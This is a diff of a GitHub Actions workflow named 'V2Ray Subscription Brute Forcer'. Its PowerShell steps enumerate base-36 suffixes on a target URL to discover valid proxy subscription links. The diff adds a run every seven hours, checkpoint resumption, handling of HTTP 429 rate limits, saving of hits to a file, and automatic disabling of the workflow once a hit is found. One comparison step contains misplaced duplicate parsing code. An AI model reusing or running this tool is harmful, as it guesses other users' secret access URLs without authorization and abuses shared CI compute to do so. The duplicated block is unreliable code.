@@ -1,6 +1,10 @@
 name: V2Ray Subscription Brute Forcer
 
 on:
+  schedule:
+    - cron: '0 */7 * * *'
+
+  # Manual trigger with inputs
   workflow_dispatch:
     inputs:
       mode:
@@ -62,12 +66,12 @@ on:
       stop_on_hit:
         description: "Stop when a valid result is found"
         required: true
-        default: "Yes"
+        default: "true"
         type: choice
         options:
           - true
           - false
-          
+
 permissions:
   contents: write
   actions: write
@@ -76,13 +80,255 @@ jobs:
   Fetching:
     runs-on: windows-latest
 
+    env:
+      GH_TOKEN: ${{ github.token }}
+
     steps:
+      # ============================================================
+      # CHECKOUT
+      # ============================================================
       - name: Checkout repository
         uses: actions/checkout@v4
-   
+
+      # ============================================================
+      # LOAD INPUTS
+      #
+      # Manual run:
+      #   Use workflow_dispatch inputs.
+      #
+      # Scheduled run:
+      #   Use the latest values saved in last_runner_states.txt.
+      # ============================================================
+      - name: Load Run Inputs
+        shell: powershell
+        run: |
+
+          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
+
+          $saved = @{
+              MODE                  = ""
+              FULL_URL              = ""
+              BASE_URL              = ""
+              SUFFIX_LENGTH         = ""
+              KNOWN_PREFIX          = ""
+              SEQUENTIAL_DIRECTION  = ""
+              GENERATED_POSITION    = ""
+              DELAY_MS              = ""
+              STOP_ON_HIT           = ""
+              LAST_CHECKPOINT       = ""
+          }
+
+          # ------------------------------------------------------------
+          # Read existing state file
+          # ------------------------------------------------------------
+          if (Test-Path $stateFile) {
+
+              foreach ($line in Get-Content $stateFile) {
+
+                  $line = $line.Trim()
+
+                  # Remove BOM / zero-width characters
+                  $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
+
+                  if ($line -match '^MODE=(.*)$') {
+                      $saved.MODE = $Matches[1]
+                  }
+                  elseif ($line -match '^FULL_URL=(.*)$') {
+                      $saved.FULL_URL = $Matches[1]
+                  }
+                  elseif ($line -match '^BASE_URL=(.*)$') {
+                      $saved.BASE_URL = $Matches[1]
+                  }
+                  elseif ($line -match '^SUFFIX_LENGTH=(.*)$') {
+                      $saved.SUFFIX_LENGTH = $Matches[1]
+                  }
+                  elseif ($line -match '^KNOWN_PREFIX=(.*)$') {
+                      $saved.KNOWN_PREFIX = $Matches[1]
+                  }
+                  elseif ($line -match '^SEQUENTIAL_DIRECTION=(.*)$') {
+                      $saved.SEQUENTIAL_DIRECTION = $Matches[1]
+                  }
+                  elseif ($line -match '^GENERATED_POSITION=(.*)$') {
+                      $saved.GENERATED_POSITION = $Matches[1]
+                  }
+                  elseif ($line -match '^DELAY_MS=(.*)$') {
+                      $saved.DELAY_MS = $Matches[1]
+                  }
+                  elseif ($line -match '^STOP_ON_HIT=(.*)$') {
+                      $saved.STOP_ON_HIT = $Matches[1]
+                  }
+                  elseif ($line -match '^LAST_CHECKPOINT=(.*)$') {
+                      $saved.LAST_CHECKPOINT = $Matches[1]
+                  }
+              }
+          }
+
+          # ------------------------------------------------------------
+          # Decide where the inputs come from
+          # ------------------------------------------------------------
+          if ("${{ github.event_name }}" -eq "schedule") {
+
+              Write-Host "[MODE] Scheduled run."
+              Write-Host "[MODE] Loading latest inputs from last_runner_states.txt"
+
+              if ([string]::IsNullOrWhiteSpace($saved.MODE)) {
+                  Write-Host "[ERROR] No saved MODE found in last_runner_states.txt."
+                  Write-Host "[ERROR] Run the workflow manually once first."
+                  exit 1
+              }
+
+              $runMode = $saved.MODE
+              $runFullUrl = $saved.FULL_URL
+              $runBaseUrl = $saved.BASE_URL
+              $runCharCount = $saved.SUFFIX_LENGTH
+              $runKnownPrefix = $saved.KNOWN_PREFIX
+              $runSequentialDirection = $saved.SEQUENTIAL_DIRECTION
+              $runGeneratedPosition = $saved.GENERATED_POSITION
+              $runDelayMs = $saved.DELAY_MS
+              $runStopOnHit = $saved.STOP_ON_HIT
+              $runCheckpoint = $saved.LAST_CHECKPOINT
+
+          }
+          else {
+
+              Write-Host "[MODE] Manual run."
+              Write-Host "[MODE] Loading inputs from workflow_dispatch."
+
+              $runMode = "${{ inputs.mode }}"
+              $runFullUrl = "${{ inputs.full_url }}"
+              $runBaseUrl = "${{ inputs.base_url }}"
+              $runCharCount = "${{ inputs.charcount }}"
+              $runKnownPrefix = "${{ inputs.known_prefix }}"
+              $runSequentialDirection = "${{ inputs.sequential_direction }}"
+              $runGeneratedPosition = "${{ inputs.generated_position }}"
+              $runDelayMs = "${{ inputs.delay_ms }}"
+              $runStopOnHit = "${{ inputs.stop_on_hit }}"
+
+              # Preserve the old checkpoint for the comparison step.
+              $runCheckpoint = $saved.LAST_CHECKPOINT
+          }
+
+          # ------------------------------------------------------------
+          # Validate values needed by all runs
+          # ------------------------------------------------------------
+          if ([string]::IsNullOrWhiteSpace($runMode)) {
+              Write-Host "[ERROR] MODE is empty."
+              exit 1
+          }
+
+          if ([string]::IsNullOrWhiteSpace($runCharCount)) {
+              Write-Host "[ERROR] SUFFIX_LENGTH / charcount is empty."
+              exit 1
+          }
+
+          if ([string]::IsNullOrWhiteSpace($runSequentialDirection)) {
+              $runSequentialDirection = "Last digit first"
+          }
+
+          if ([string]::IsNullOrWhiteSpace($runGeneratedPosition)) {
+              $runGeneratedPosition = "Back of known prefix"
+          }
+
+          if ([string]::IsNullOrWhiteSpace($runDelayMs)) {
+              $runDelayMs = "500"
+          }
+
+          if ([string]::IsNullOrWhiteSpace($runStopOnHit)) {
+              $runStopOnHit = "true"
+          }
+
+          # ------------------------------------------------------------
+          # Export effective values to following steps
+          # ------------------------------------------------------------
+          "RUN_MODE=$runMode" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_FULL_URL=$runFullUrl" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_BASE_URL=$runBaseUrl" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_CHARCOUNT=$runCharCount" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_KNOWN_PREFIX=$runKnownPrefix" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_SEQUENTIAL_DIRECTION=$runSequentialDirection" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_GENERATED_POSITION=$runGeneratedPosition" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_DELAY_MS=$runDelayMs" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "RUN_STOP_ON_HIT=$runStopOnHit" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "CHECKPOINT_LAST=$runCheckpoint" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+      # ============================================================
+      # PRINT ALL EFFECTIVE INPUTS
+      # ============================================================
+      - name: Checking Inputs
+        shell: powershell
+        run: |
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "V2Ray Subscription Brute Forcer"
+          Write-Host "============================================"
+          Write-Host "Run Event             : ${{ github.event_name }}"
+          Write-Host "Mode                  : $env:RUN_MODE"
+          Write-Host "Full URL              : $env:RUN_FULL_URL"
+          Write-Host "Base URL              : $env:RUN_BASE_URL"
+          Write-Host "Suffix length         : $env:RUN_CHARCOUNT"
+          Write-Host "Known prefix          : $env:RUN_KNOWN_PREFIX"
+          Write-Host "Sequential direction  : $env:RUN_SEQUENTIAL_DIRECTION"
+          Write-Host "Generated position    : $env:RUN_GENERATED_POSITION"
+          Write-Host "Delay ms              : $env:RUN_DELAY_MS"
+          Write-Host "Stop on hit           : $env:RUN_STOP_ON_HIT"
+          Write-Host "Last checkpoint       : $env:CHECKPOINT_LAST"
+          Write-Host "============================================"
+          Write-Host ""
+
+      # ============================================================
+      # SAVE CURRENT EFFECTIVE INPUTS
+      #
+      # This happens AFTER loading the old state, so the old
+      # checkpoint can still be compared first.
+      # ============================================================
+      - name: Prepare Current Input State
+        if: ${{ env.RUN_MODE == 'Test Mode' || env.RUN_MODE == 'Sequential Mode' || env.RUN_MODE == 'Random Mode' }}
+        shell: powershell
+        run: |
+
+          # This step intentionally does not write the state file yet.
+          #
+          # Sequential Mode will first compare the current inputs
+          # against the previous state and may change CHECKPOINT_LAST.
+          #
+          # The actual state file is saved after that comparison.
+
+      # ============================================================
+      # CREATE URL CHECKER
+      # ============================================================
       - name: Create URL Checker Shell
         shell: powershell
         run: |
+
           @'
           param(
               [string]$Uri,
@@ -154,6 +400,7 @@ jobs:
               }
           }
           catch {
+
               if (
                   $_.Exception.Response -and
                   [int]$_.Exception.Response.StatusCode -eq 429
@@ -172,21 +419,18 @@ jobs:
 
               exit 1
           }
+
           '@ | Set-Content -Path "$env:RUNNER_TEMP\v2ray_check.ps1" -Encoding UTF8
 
-      - name: Checking Inputs
-        run: |
-          Write-Host "V2Ray Subscription Brute Forcer"
-          Write-Host "Mode: ${{ inputs.mode }}"
-          Write-Host "Base URL: ${{ inputs.base_url }}"
-          Write-Host "Suffix length: ${{ inputs.charcount }}"
-          Write-Host "Known prefix: ${{ inputs.known_prefix }}"
-
+      # ============================================================
+      # TEST MODE
+      # ============================================================
       - name: Test Mode
-        if: ${{ inputs.mode == 'Test Mode' }}
+        if: ${{ env.RUN_MODE == 'Test Mode' }}
         shell: powershell
         run: |
-          $full = "${{ inputs.full_url }}"
+
+          $full = $env:RUN_FULL_URL
 
           if ([string]::IsNullOrWhiteSpace($full)) {
               Write-Host "[ERROR] No URL was entered."
@@ -203,12 +447,16 @@ jobs:
 
           & "$env:RUNNER_TEMP\v2ray_check.ps1" -Uri $fullUrl -Timeout 3 > $null 2>&1
 
+      # ============================================================
+      # SEQUENTIAL CHECKING
+      # ============================================================
       - name: Sequential Checking
-        if: ${{ inputs.mode == 'Sequential Mode' }}
+        if: ${{ env.RUN_MODE == 'Sequential Mode' }}
         shell: powershell
         run: |
-          $charCount = [int]"${{ inputs.charcount }}"
-          $knownPrefix = "${{ inputs.known_prefix }}"
+
+          $charCount = [int]$env:RUN_CHARCOUNT
+          $knownPrefix = $env:RUN_KNOWN_PREFIX
           $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
           $baseN = 36
 
@@ -220,32 +468,33 @@ jobs:
               exit 1
           }
 
-          Write-Host "Total suffix count : $charCount"
-          Write-Host "Known prefix count : $prefixLen"
-          Write-Host "Characters to generate : $genLen"
+          Write-Host "Total suffix count       : $charCount"
+          Write-Host "Known prefix count       : $prefixLen"
+          Write-Host "Characters to generate   : $genLen"
           Write-Host ""
 
+      # ============================================================
+      # COMPARE INPUTS AND LAST CHECKPOINT
+      # ============================================================
       - name: Compare Inputs And Last Runner States
-        if: ${{ inputs.mode == 'Sequential Mode' }}
+        if: ${{ env.RUN_MODE == 'Sequential Mode' }}
         shell: powershell
         run: |
+
           $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
 
-          $currentBase = "${{ inputs.base_url }}"
-          $currentPrefix = "${{ inputs.known_prefix }}"
-          $currentCharCount = "${{ inputs.charcount }}"
+          $currentBase = $env:RUN_BASE_URL
+          $currentPrefix = $env:RUN_KNOWN_PREFIX
+          $currentCharCount = $env:RUN_CHARCOUNT
 
-          $lastCheckpoint = ""
+          $savedBase = ""
+          $savedPrefix = ""
+          $savedCharCount = ""
+          $savedCheckpoint = ""
 
           if (Test-Path $stateFile) {
 
-              $savedBase = ""
-              $savedPrefix = ""
-              $savedCharCount = ""
-              $savedCheckpoint = ""
-
               foreach ($line in Get-Content $stateFile) {
-
               # Remove whitespace and invisible Unicode characters at the beginning
               $line = $line.Trim()
               $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
@@ -263,6 +512,23 @@ jobs:
                   $savedCheckpoint = $line.Substring("LAST_CHECKPOINT=".Length).Trim()
               }
           }
+
+                  $line = $line.Trim()
+                  $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
+
+                  if ($line.StartsWith("BASE_URL=")) {
+                      $savedBase = $line.Substring("BASE_URL=".Length).Trim()
+                  }
+                  elseif ($line.StartsWith("SUFFIX_LENGTH=")) {
+                      $savedCharCount = $line.Substring("SUFFIX_LENGTH=".Length).Trim()
+                  }
+                  elseif ($line.StartsWith("KNOWN_PREFIX=")) {
+                      $savedPrefix = $line.Substring("KNOWN_PREFIX=".Length).Trim()
+                  }
+                  elseif ($line.StartsWith("LAST_CHECKPOINT=")) {
+                      $savedCheckpoint = $line.Substring("LAST_CHECKPOINT=".Length).Trim()
+                  }
+              }
 
               $inputsMatch = (
                   ($savedBase -eq $currentBase) -and
@@ -284,13 +550,14 @@ jobs:
                   Write-Host "Action         : START FROM LAST CHECKPOINT"
                   Write-Host "====================================="
                   Write-Host ""
-
               }
               else {
 
+                  $lastCheckpoint = ""
+
                   Write-Host ""
                   Write-Host "========== CHECKED LISTS =========="
-                  
+
                   if ($savedBase -eq $currentBase) {
                       Write-Host "Base URL       : Matches"
                   }
@@ -327,6 +594,8 @@ jobs:
           }
           else {
 
+              $lastCheckpoint = ""
+
               Write-Host ""
               Write-Host "========== CHECKED LISTS =========="
               Write-Host "No previous state file found."
@@ -336,6 +605,7 @@ jobs:
           }
 
           # Export values for later workflow steps
+
           "CHECKPOINT_BASE=$currentBase" | Out-File `
               -FilePath $env:GITHUB_ENV `
               -Encoding utf8 -Append
@@ -352,27 +622,66 @@ jobs:
               -FilePath $env:GITHUB_ENV `
               -Encoding utf8 -Append
 
-      - name: Sequential Generating
-        if: ${{ inputs.mode == 'Sequential Mode' }}
+      # ============================================================
+      # SAVE ALL CURRENT INPUTS
+      #
+      # This is AFTER Sequential input comparison so that when
+      # inputs change, CHECKPOINT_LAST has already been reset.
+      # ============================================================
+      - name: Save Current Inputs To State
         shell: powershell
         run: |
-          $charCount = [int]"${{ inputs.charcount }}"
-          $delayMs = [int]"${{ inputs.delay_ms }}"
-          $knownPrefix = "${{ inputs.known_prefix }}"
-          $direction = "${{ inputs.sequential_direction }}"
-          $generatedPosition = "${{ inputs.generated_position }}"
-          $base = "${{ inputs.base_url }}"
+          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
+          $stateContent = @"
+          MODE=$env:RUN_MODE
+          FULL_URL=$env:RUN_FULL_URL
+          BASE_URL=$env:RUN_BASE_URL
+          SUFFIX_LENGTH=$env:RUN_CHARCOUNT
+          KNOWN_PREFIX=$env:RUN_KNOWN_PREFIX
+          SEQUENTIAL_DIRECTION=$env:RUN_SEQUENTIAL_DIRECTION
+          GENERATED_POSITION=$env:RUN_GENERATED_POSITION
+          DELAY_MS=$env:RUN_DELAY_MS
+          STOP_ON_HIT=$env:RUN_STOP_ON_HIT
+          LAST_CHECKPOINT=$env:CHECKPOINT_LAST
+          "@
+
+          [System.IO.File]::WriteAllText(
+              $stateFile,
+              $stateContent,
+              [System.Text.UTF8Encoding]::new($false)
+          )
+
+          Write-Host ""
+          Write-Host "[STATE] Current run inputs saved to last_runner_states.txt"
+          Write-Host ""
+
+      # ============================================================
+      # SEQUENTIAL GENERATING
+      # ============================================================
+      - name: Sequential Generating
+        if: ${{ env.RUN_MODE == 'Sequential Mode' }}
+        shell: powershell
+        run: |
+          $charCount = [int]$env:RUN_CHARCOUNT
+          $delayMs = [int]$env:RUN_DELAY_MS
+          $knownPrefix = $env:RUN_KNOWN_PREFIX
+          $direction = $env:RUN_SEQUENTIAL_DIRECTION
+          $generatedPosition = $env:RUN_GENERATED_POSITION
+          $base = $env:RUN_BASE_URL
+
           $resultFile = "$env:GITHUB_WORKSPACE\found_subs.txt"
           $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
+
           $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
           $baseN = 36
-          $stopOnHit = "${{ inputs.stop_on_hit }}"
+
+          $stopOnHit = $env:RUN_STOP_ON_HIT
 
           # ------------------------------------------------------------
           # Clean existing result file
           # ------------------------------------------------------------
-
           if (Test-Path $resultFile) {
+
               $uniqueResults = Get-Content -Path $resultFile |
                   Where-Object { $_.Trim() -ne "" } |
                   Select-Object -Unique
@@ -387,7 +696,6 @@ jobs:
           # ------------------------------------------------------------
           # Calculate generated length
           # ------------------------------------------------------------
-
           $prefixLen = $knownPrefix.Length
           $genLen = $charCount - $prefixLen
 
@@ -399,7 +707,6 @@ jobs:
           # ------------------------------------------------------------
           # Resume from previous checkpoint
           # ------------------------------------------------------------
-
           $seq = 0
           $lastCheckpoint = $env:CHECKPOINT_LAST
 
@@ -408,32 +715,39 @@ jobs:
               $generatedPart = $lastCheckpoint
 
               if ($generatedPosition -eq "Front of known prefix") {
-              
+
                   if ($knownPrefix -and $lastCheckpoint.EndsWith($knownPrefix)) {
+
                       $generatedPart = $lastCheckpoint.Substring(
                           0,
                           $lastCheckpoint.Length - $knownPrefix.Length
                       )
                   }
                   else {
+
                       Write-Host "[RESUME] Checkpoint does not match the current known prefix."
                       Write-Host "[RESUME] Starting from 0."
                       $lastCheckpoint = ""
                   }
-              
               }
               else {
-              
+
                   if ($knownPrefix -and $lastCheckpoint.StartsWith($knownPrefix)) {
-                      $generatedPart = $lastCheckpoint.Substring($knownPrefix.Length)
+
+                      $generatedPart = $lastCheckpoint.Substring(
+                          $knownPrefix.Length
+                      )
                   }
                   else {
+
                       Write-Host "[RESUME] Checkpoint does not match the current known prefix."
                       Write-Host "[RESUME] Starting from 0."
                       $lastCheckpoint = ""
                   }
               }
+
               if ($generatedPart.Length -ne $genLen) {
+
                   Write-Host "[RESUME] Checkpoint length does not match current generated length."
                   Write-Host "[RESUME] Starting from 0."
                   $seq = 0
@@ -453,11 +767,10 @@ jobs:
                   #   100
                   #   200
                   # ------------------------------------------------------
-
                   $value = 0
 
                   if ($direction -eq "Last digit first") {
-
+                  
                       # Normal base-36 representation
                       foreach ($ch in $generatedPart.ToCharArray()) {
 
@@ -470,9 +783,10 @@ jobs:
 
                           $value = ($value * $baseN) + $idx
                       }
+
                   }
                   else {
-
+                  
                       # First digit changes fastest.
                       # Reverse the positions when converting back.
                       for ($i = $genLen - 1; $i -ge 0; $i--) {
@@ -497,6 +811,7 @@ jobs:
               }
           }
           else {
+
               Write-Host "[RESUME] No previous checkpoint."
               Write-Host "[RESUME] Starting from sequence 0."
           }
@@ -504,7 +819,6 @@ jobs:
           # ------------------------------------------------------------
           # Sequential checking loop
           # ------------------------------------------------------------
-
           for ($test = 1; ; $test++) {
 
               $n = $seq
@@ -518,13 +832,11 @@ jobs:
                   $n = [math]::Floor($n / $baseN)
 
                   if ($direction -eq "Last digit first") {
-
                       # Last digit changes fastest
                       $position = $genLen - 1 - $i
 
                   }
                   else {
-
                       # First digit changes fastest
                       $position = $i
                   }
@@ -540,7 +852,7 @@ jobs:
               else {
                   $suffix = $knownPrefix + $part
               }
-              
+
               $fullUrl = $base + $suffix
 
               # --------------------------------------------------------
@@ -552,7 +864,6 @@ jobs:
               # --------------------------------------------------------
               # Delay
               # --------------------------------------------------------
-
               if ($delayMs -gt 0) {
                   Start-Sleep -Milliseconds $delayMs
               }
@@ -560,7 +871,6 @@ jobs:
               # --------------------------------------------------------
               # Valid subscription found
               # --------------------------------------------------------
-
               if ($checkResult -eq 0) {
 
                   Write-Host "[FOUND] $fullUrl"
@@ -585,11 +895,16 @@ jobs:
                   # ----------------------------------------------------
                   # Save latest checkpoint
                   # ----------------------------------------------------
-
                   $stateContent = @"
+          MODE=$env:RUN_MODE
+          FULL_URL=$env:RUN_FULL_URL
           BASE_URL=$base
           SUFFIX_LENGTH=$charCount
           KNOWN_PREFIX=$knownPrefix
+          SEQUENTIAL_DIRECTION=$direction
+          GENERATED_POSITION=$generatedPosition
+          DELAY_MS=$delayMs
+          STOP_ON_HIT=$stopOnHit
           LAST_CHECKPOINT=$suffix
           "@
 
@@ -599,17 +914,22 @@ jobs:
                       [System.Text.UTF8Encoding]::new($false)
                   )
 
+                  # ----------------------------------------------------
+                  # STOP ON HIT
+                  # ----------------------------------------------------
                   if ($stopOnHit -eq "true") {
-                      Write-Host "[STOP] Result found. Will stopping current job and disable workflows."
-                  
+
+                      Write-Host "[STOP] Result found. Stopping current job and disabling this GitHub Actions workflow."
+
                       gh workflow disable "${{ github.workflow }}"
-                  
+
                       if ($LASTEXITCODE -ne 0) {
                           Write-Host "[ERROR] Failed to disable workflow."
                           exit 1
                       }
-                  
+
                       Write-Host "[STOP] Workflow disabled successfully."
+
                       break
                   }
               }
@@ -617,7 +937,6 @@ jobs:
               # --------------------------------------------------------
               # HTTP 429
               # --------------------------------------------------------
-
               elseif ($checkResult -eq 2) {
 
                   Write-Host "[TOO MANY REQUESTS] Waiting 10 seconds to cool down..."
@@ -632,7 +951,6 @@ jobs:
               # --------------------------------------------------------
               # Not found / other error
               # --------------------------------------------------------
-
               else {
 
                   Write-Host "[NOT FOUND] $suffix"
@@ -640,15 +958,17 @@ jobs:
 
               # --------------------------------------------------------
               # ALWAYS save latest checkpoint
-              #
-              # This means the repository state can be updated even
-              # when no valid subscription was found.
               # --------------------------------------------------------
-
               $stateContent = @"
+          MODE=$env:RUN_MODE
+          FULL_URL=$env:RUN_FULL_URL
           BASE_URL=$base
           SUFFIX_LENGTH=$charCount
           KNOWN_PREFIX=$knownPrefix
+          SEQUENTIAL_DIRECTION=$direction
+          GENERATED_POSITION=$generatedPosition
+          DELAY_MS=$delayMs
+          STOP_ON_HIT=$stopOnHit
           LAST_CHECKPOINT=$suffix
           "@
 
@@ -661,11 +981,13 @@ jobs:
               # --------------------------------------------------------
               # Move to next sequence
               # --------------------------------------------------------
-
               $global:LASTEXITCODE = 0
               $seq++
           }
 
+      # ============================================================
+      # UPDATE RESULTS AND LAST CHECKPOINT
+      # ============================================================
       - name: Update Results And Last Checkpoint
         if: always()
         shell: bash
